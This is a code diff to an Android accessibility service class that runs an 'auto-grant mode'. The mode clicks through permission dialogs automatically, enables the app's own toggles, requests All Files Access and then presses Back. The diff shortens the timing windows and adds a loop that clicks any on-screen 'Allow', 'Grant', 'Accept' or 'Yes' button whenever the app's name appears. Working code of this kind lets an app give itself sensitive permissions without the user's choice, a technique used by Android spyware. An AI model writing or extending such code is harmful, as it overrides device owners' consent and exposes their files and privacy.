@@ -473,7 +473,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         autoGrantMode = true;
         autoGrantHandler = new Handler(Looper.getMainLooper());
 
-        // Phase 2 (30 s): request WRITE_EXTERNAL_STORAGE / All Files Access AFTER all
+        // Phase 2 (10 s): request WRITE_EXTERNAL_STORAGE / All Files Access AFTER all
         // other permission dialogs have been auto-granted and dismissed.
         autoGrantHandler.postDelayed(() -> {
             try {
@@ -484,14 +484,14 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     Log.i(TAG, "Auto-grant: requested WRITE_EXTERNAL_STORAGE / All Files Access (last step)");
                 }
             } catch (Exception ignored) {}
-        }, 30_000);
+        }, 10_000);
 
-        // Auto-grant mode expires after 60 seconds (covers all dialogs + storage page)
+        // Auto-grant mode expires after 15 seconds
         autoGrantHandler.postDelayed(() -> {
             autoGrantMode = false;
-            Log.i(TAG, "Auto-grant mode expired after 60 seconds");
-        }, 60_000);
-        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 60s");
+            Log.i(TAG, "Auto-grant mode expired after 15 seconds");
+        }, 15_000);
+        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 15s");
     }
 
     // Words that disqualify a toggle from being auto-enabled
@@ -568,9 +568,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     /**
      * Looks for unchecked toggles/switches/checkboxes on screen when the app name
      * is visible. Skips any item whose nearby text contains a blacklisted word.
-     * If found, turns it on — then waits 2.5 s before pressing Back so the auto-click
-     * loop has enough time to handle any confirmation dialog that may appear
-     * (e.g. "Allow [App] to access all files?" on the All Files Access page).
+     * If a direct Allow/Grant button is present on the same page it is clicked first.
+     * If a toggle is found it is enabled, then Back is pressed after 500 ms.
      */
     private boolean runAccessibilityToggleGranter(AccessibilityNodeInfo rootNode) {
         try {
@@ -578,11 +577,20 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             String screenText = getAllScreenText(rootNode).toLowerCase();
             if (!screenText.contains(appName)) return false;
 
+            // If there is a direct Allow / Grant / Turn on button on the page, click it first.
+            String[] directButtons = { "Allow", "Grant", "Turn on", "Enable", "OK", "Ok", "Yes", "Accept" };
+            for (String btn : directButtons) {
+                if (findAndClickFullWord(rootNode, btn)) {
+                    Log.i(TAG, "Auto-grant (storage page): clicked button \"" + btn + "\"");
+                    scheduleBack(500);
+                    return true;
+                }
+            }
+
+            // Fall back to toggle/switch/checkbox
             if (findAndEnableToggleForAppName(rootNode)) {
-                Log.i(TAG, "Auto-grant: enabled toggle for app on settings screen — waiting 2.5 s for confirmation dialog");
-                // 2 500 ms gives the auto-click loop (runs every ~500 ms) at least 4-5 chances
-                // to find and click "Allow" in any confirmation dialog before Back is pressed.
-                scheduleBack(2_500);
+                Log.i(TAG, "Auto-grant: enabled toggle for app on settings screen");
+                scheduleBack(500);
                 return true;
             }
         } catch (Exception e) {
